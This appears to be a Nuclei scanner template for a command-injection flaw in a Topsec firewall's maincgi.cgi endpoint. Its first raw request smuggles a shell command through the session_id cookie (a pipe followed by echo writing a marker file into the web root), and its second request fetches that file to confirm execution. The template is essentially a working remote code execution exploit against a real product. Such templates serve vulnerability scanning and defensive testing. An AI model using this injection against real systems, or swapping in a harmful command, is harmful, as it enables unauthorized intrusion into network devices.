id: topsec-cookie-rce
info:
  author: Str1am
  name: "\u5929\u878D\u4FE1\u9632\u706B\u5899Cookie\u547D\u4EE4\u6267\u884C"
  severity: high
  tags: topsec,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - nvgjngfszfzahgf1
  matchers-condition: and
  raw:
  - 'GET /cgi/maincgi.cgi?Url=aa HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101
    Firefox/96.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Upgrade-Insecure-Requests: 1

    Sec-Fetch-Dest: document

    Sec-Fetch-Mode: navigate

    Cookie: session_id_443=1|echo nvgjngfszfzahgf1 > /www/htdocs/site/image/vfhds.txt

    '
  - "GET /site/image/vfhds.txt HTTP/1.1\nHost: {{Hostname}}        \n"
